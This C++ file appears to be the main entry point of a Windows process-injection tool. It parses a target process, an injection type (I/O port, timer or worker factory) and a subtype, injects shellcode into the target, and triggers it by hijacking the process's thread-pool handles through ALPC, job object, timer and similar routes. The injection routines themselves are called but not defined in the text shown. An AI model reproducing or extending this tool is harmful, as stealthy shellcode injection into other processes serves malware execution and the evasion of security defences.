#include "../include/Main.hpp"



int wmain(int argc, wchar_t** argv) {


	if (argc < 4) {

		std::cout << "Usage: \n" <<
			"1: [Target Process]\n" <<
			"2: [Injection Type] - Options: \"/ioport\", \"/timer\", \"/workerfactory\"\n\n" <<
			"3: [Subtypes] - Options: \n\t{\"work\", \"startroutine\"}: for /workerfactory\n" <<
			"\t{\"wait\", \"jobobject\", \"alpc\", \"direct\", \"tpio\"}: for /ioport\n" <<
			"\t{\"tptimer\"}: for /timer\n";
		
		return EXIT_FAILURE;
	}
	

	HandleHijackClass handleType;

	switch ( *(reinterpret_cast<uint64_t*>(argv[2])) ) {

		case ARGUMENT_IOPORT:
			handleType = TpIoPort;
			break;

		case ARGUMENT_TIMER:
			handleType = TpTimer;
			break;

		case ARGUMENT_WORKERFACTORY:
			handleType = TpWorkerFactory;
			break;

		default:
			std::wcerr << L"\n{!!} Invalid Command Line Argument Supplied: " << argv[2] << std::endl;
			return EXIT_FAILURE;
	}
	

	Process targetProcess(argv[1], handleType);

	if (!targetProcess.init()) {
		return EXIT_FAILURE;
	}

	if (wcscmp(argv[3], L"startroutine") != 0) {
		if (!targetProcess.injectShellcode()) {
			return EXIT_FAILURE;
		}
	}



	bool succeeded = false;
	switch (*(reinterpret_cast<uint64_t*>(argv[3]))) {

		case SUBTYPE_WORKERFACTORY_STARTROUTINE:
			succeeded = targetProcess.ProcessWorkerFactoryInject();
			break;

		case SUBTYPE_WORKERFACTORY_WORK:
			succeeded = targetProcess.ProcessWorkInject();
			break;

		case SUBTYPE_IOPORT_ALPC:
			succeeded = targetProcess.ProcessAlpcInject();
			break;
	
		case SUBTYPE_IOPORT_DIRECT:
			succeeded = targetProcess.ProcessTpDirectInject();
			break;

		case SUBTYPE_IOPORT_JOBOBJECT:
			succeeded = targetProcess.ProcessJobInject();
			break;

		case SUBTYPE_IOPORT_TPIO:
			succeeded = targetProcess.ProcessTpIoInject();
			break;

		case SUBTYPE_IOPORT_WAIT:
			succeeded = targetProcess.ProcessWaitInject();
			break;

		case SUBTYPE_TIMER_TPTIMER:
			succeeded = targetProcess.ProcessTimerInject();
			break;

		default:
			std::wcerr << L"\n{!!} Invalid Injection Subtype Sent: " << argv[3] << std::endl;
			break;
	}

	
	if (!succeeded) {
		return EXIT_FAILURE;
	}


	std::cout << "{+} Finished successfully." << std::endl;
	return EXIT_SUCCESS;
}
